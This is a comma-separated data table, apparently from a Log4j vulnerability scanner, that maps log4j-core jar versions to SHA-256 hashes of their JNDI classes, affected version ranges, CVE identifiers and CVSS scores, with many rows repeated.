        log4j-core-2.13.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.3.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.14.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,77323460255818f4cbfe180141d6001bfb575b429e00a07cbceabd59adf334d6,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,"2.14.0, 2.14.1",CVE-2021-44228," 10.0"
        log4j-core-2.14.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,77323460255818f4cbfe180141d6001bfb575b429e00a07cbceabd59adf334d6,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,"2.14.0, 2.14.1",CVE-2021-44228," 10.0"
        log4j-core-2.15.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,db07ef1ea174e000b379732681bd835cfede648a7971bf4e9a0d31981582d69e,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,2.15.0,CVE-2021-45046," 9.0"
        log4j-core-2.16.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,5210e6aae7dd8a61cd16c56937c5f2ed43941487830f46e99d0d3f45bfa6f953,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,2.16.0,CVE-2021-45105," 7.5"
        log4j-core-2.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.3.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.4.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.4.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.5.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.6.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.6.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.6.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.7.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,cee2305065bb61d434cdb45cfdaa46e7da148e5c6a7678d56f3e3dc8d7073eae,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,66c89e2d5ae674641138858b571e65824df6873abb1677f7b2ef5c0dd4dbc442,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,66c89e2d5ae674641138858b571e65824df6873abb1677f7b2ef5c0dd4dbc442,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,764b06686dbe06e3d5f6d15891250ab04073a0d1c357d114b7365c70fa8a7407,org/apache/logging/log4j/core/lookup/JndiLookup.class,d4ec57440cd6db6eaf6bcb6b197f1cbaf5a3e26253d59578d51db307357cbf15,2.8.2,CVE-2021-44228," 10.0"
        log4j-core-2.9.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.9.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.0-beta9.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-osgi-reduced-2.0-beta9.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-2.0.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,fd6c63c11f7a6b52eff04be1de3477c9ddbbc925022f7216320e6db93f1b7d29,org/apache/logging/log4j/core/lookup/JndiLookup.class,fd6c63c11f7a6b52eff04be1de3477c9ddbbc925022f7216320e6db93f1b7d29,2.0.0,CVE-2021-44228," 10.0"
        log4j-core-2.0-rc1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-osgi-reduced-2.0-rc1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-2.0-rc2.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,a03e538ed25eff6c4fe48aabc5514e5ee687542f29f2206256840e74ed59bcd2,org/apache/logging/log4j/core/lookup/JndiLookup.class,a03e538ed25eff6c4fe48aabc5514e5ee687542f29f2206256840e74ed59bcd2,2.0.0-rc2,CVE-2021-44228," 10.0"
        log4j-core-2.0.1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,2.0.1,CVE-2021-44228," 10.0"
        log4j-core-2.0.2.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,9626798cce6abd0f2ffef89f1a3d0092a60d34a837a02bbe571dbe00236a2c8c,org/apache/logging/log4j/core/lookup/JndiLookup.class,9626798cce6abd0f2ffef89f1a3d0092a60d34a837a02bbe571dbe00236a2c8c,2.0.2,CVE-2021-44228," 10.0"
        log4j-core-2.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.10.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,1fa92c00fa0b305b6bbe6e2ee4b012b588a906a20a05e135cbe64c9d77d676de,org/apache/logging/log4j/core/lookup/JndiLookup.class,5c104d16ff9831b456e4d7eaf66bcf531f086767782d08eece3fb37e40467279,"2.12.0, 2.12.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,1fa92c00fa0b305b6bbe6e2ee4b012b588a906a20a05e135cbe64c9d77d676de,org/apache/logging/log4j/core/lookup/JndiLookup.class,5c104d16ff9831b456e4d7eaf66bcf531f086767782d08eece3fb37e40467279,"2.12.0, 2.12.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,b1960d63a3946f9e16e1920624f37c152b58b98932ed04df99ed5d9486732afb,org/apache/logging/log4j/core/lookup/JndiLookup.class,febbc7867784d0f06934fec59df55ee45f6b24c55b17fff71cc4fca80bf22ebb,2.12.2,CVE-2021-44228," 10.0"
        log4j-core-2.13.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.3.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.14.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,77323460255818f4cbfe180141d6001bfb575b429e00a07cbceabd59adf334d6,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,"2.14.0, 2.14.1",CVE-2021-44228," 10.0"
        log4j-core-2.14.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,77323460255818f4cbfe180141d6001bfb575b429e00a07cbceabd59adf334d6,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,"2.14.0, 2.14.1",CVE-2021-44228," 10.0"
        log4j-core-2.15.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,db07ef1ea174e000b379732681bd835cfede648a7971bf4e9a0d31981582d69e,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,2.15.0,CVE-2021-45046," 9.0"
        log4j-core-2.16.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,5210e6aae7dd8a61cd16c56937c5f2ed43941487830f46e99d0d3f45bfa6f953,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,2.16.0,CVE-2021-45105," 7.5"
        log4j-core-2.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.3.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.4.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.4.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.5.jar,org/apache/logging/log4j/core/net/JndiManager.class,3bff6b3011112c0b5139a5c3aa5e698ab1531a2f130e86f9e4262dd6018916d7,org/apache/logging/log4j/core/lookup/JndiLookup.class,a534961bbfce93966496f86c9314f46939fd082bb89986b48b7430c3bea903f7,"2.4.0, 2.4.1, 2.5.0",CVE-2021-44228," 10.0"
        log4j-core-2.6.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.6.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.6.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,6540d5695ddac8b0a343c2e91d58316cfdbfdc5b99c6f3f91bc381bc6f748246,org/apache/logging/log4j/core/lookup/JndiLookup.class,e8ffed196e04f81b015f847d4ec61f22f6731c11b5a21b1cfc45ccbc58b8ea45,"2.6.0, 2.6.1, 2.6.2",CVE-2021-44228," 10.0"
        log4j-core-2.7.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,cee2305065bb61d434cdb45cfdaa46e7da148e5c6a7678d56f3e3dc8d7073eae,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,66c89e2d5ae674641138858b571e65824df6873abb1677f7b2ef5c0dd4dbc442,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,1584b839cfceb33a372bb9e6f704dcea9701fa810a9ba1ad3961615a5b998c32,org/apache/logging/log4j/core/lookup/JndiLookup.class,66c89e2d5ae674641138858b571e65824df6873abb1677f7b2ef5c0dd4dbc442,"2.7.0, 2.8.0, 2.8.1",CVE-2021-44228," 10.0"
        log4j-core-2.8.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,764b06686dbe06e3d5f6d15891250ab04073a0d1c357d114b7365c70fa8a7407,org/apache/logging/log4j/core/lookup/JndiLookup.class,d4ec57440cd6db6eaf6bcb6b197f1cbaf5a3e26253d59578d51db307357cbf15,2.8.2,CVE-2021-44228," 10.0"
        log4j-core-2.9.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.9.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.0.1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,2.0.1,CVE-2021-44228," 10.0"
        log4j-core-2.0-rc1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,org/apache/logging/log4j/core/lookup/JndiLookup.class,39a495034d37c7934b64a9aa686ea06b61df21aa222044cc50a47d6903ba1ca8,"2.0.0-beta9, 2.0.0-rc1",CVE-2021-44228," 10.0"
        log4j-core-2.0-rc2.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,a03e538ed25eff6c4fe48aabc5514e5ee687542f29f2206256840e74ed59bcd2,org/apache/logging/log4j/core/lookup/JndiLookup.class,a03e538ed25eff6c4fe48aabc5514e5ee687542f29f2206256840e74ed59bcd2,2.0.0-rc2,CVE-2021-44228," 10.0"
        log4j-core-2.0.1.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,org/apache/logging/log4j/core/lookup/JndiLookup.class,964fa0bf8c045097247fa0c973e0c167df08720409fd9e44546e0ceda3925f3e,2.0.1,CVE-2021-44228," 10.0"
        log4j-core-2.0.2.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,9626798cce6abd0f2ffef89f1a3d0092a60d34a837a02bbe571dbe00236a2c8c,org/apache/logging/log4j/core/lookup/JndiLookup.class,9626798cce6abd0f2ffef89f1a3d0092a60d34a837a02bbe571dbe00236a2c8c,2.0.2,CVE-2021-44228," 10.0"
        log4j-core-2.0.jar,org/apache/logging/log4j/core/lookup/JndiLookup.class,fd6c63c11f7a6b52eff04be1de3477c9ddbbc925022f7216320e6db93f1b7d29,org/apache/logging/log4j/core/lookup/JndiLookup.class,fd6c63c11f7a6b52eff04be1de3477c9ddbbc925022f7216320e6db93f1b7d29,2.0.0,CVE-2021-44228," 10.0"
        log4j-core-2.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,ae950f9435c0ef3373d4030e7eff175ee11044e584b7f205b7a9804bbe795f9c,org/apache/logging/log4j/core/lookup/JndiLookup.class,a768e5383990b512f9d4f97217eda94031c2fa4aea122585f5a475ab99dc7307,"2.1.0, 2.2.0, 2.3.0",CVE-2021-44228," 10.0"
        log4j-core-2.10.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.11.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,293d7e83d4197f0496855f40a7745cfcdd10026dc057dfc1816de57295be88a6,org/apache/logging/log4j/core/lookup/JndiLookup.class,0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e,"2.10.0, 2.11.0, 2.11.1, 2.11.2, 2.9.0, 2.9.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,1fa92c00fa0b305b6bbe6e2ee4b012b588a906a20a05e135cbe64c9d77d676de,org/apache/logging/log4j/core/lookup/JndiLookup.class,5c104d16ff9831b456e4d7eaf66bcf531f086767782d08eece3fb37e40467279,"2.12.0, 2.12.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,1fa92c00fa0b305b6bbe6e2ee4b012b588a906a20a05e135cbe64c9d77d676de,org/apache/logging/log4j/core/lookup/JndiLookup.class,5c104d16ff9831b456e4d7eaf66bcf531f086767782d08eece3fb37e40467279,"2.12.0, 2.12.1",CVE-2021-44228," 10.0"
        log4j-core-2.12.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,b1960d63a3946f9e16e1920624f37c152b58b98932ed04df99ed5d9486732afb,org/apache/logging/log4j/core/lookup/JndiLookup.class,febbc7867784d0f06934fec59df55ee45f6b24c55b17fff71cc4fca80bf22ebb,2.12.2,CVE-2021-44228," 10.0"
        log4j-core-2.13.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.1.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.2.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.13.3.jar,org/apache/logging/log4j/core/net/JndiManager.class,c3e95da6542945c1a096b308bf65bbd7fcb96e3d201e5a2257d85d4dedc6a078,org/apache/logging/log4j/core/lookup/JndiLookup.class,2b32bfc0556ea59307b9b2fde75b6dfbb5bf4f1d008d1402bc9a2357d8a8c61f,"2.13.0, 2.13.1, 2.13.2, 2.13.3",CVE-2021-44228," 10.0"
        log4j-core-2.14.0.jar,org/apache/logging/log4j/core/net/JndiManager.class,77323460255818f4cbfe180141d6001bfb575b429e00a07cbceabd59adf334d6,org/apache/logging/log4j/core/lookup/JndiLookup.class,84057480ba7da6fb6d9ea50c53a00848315833c1f34bf8f4a47f11a14499ae3f,"2.14.0, 2.14.1",CVE-2021-44228," 10.0"
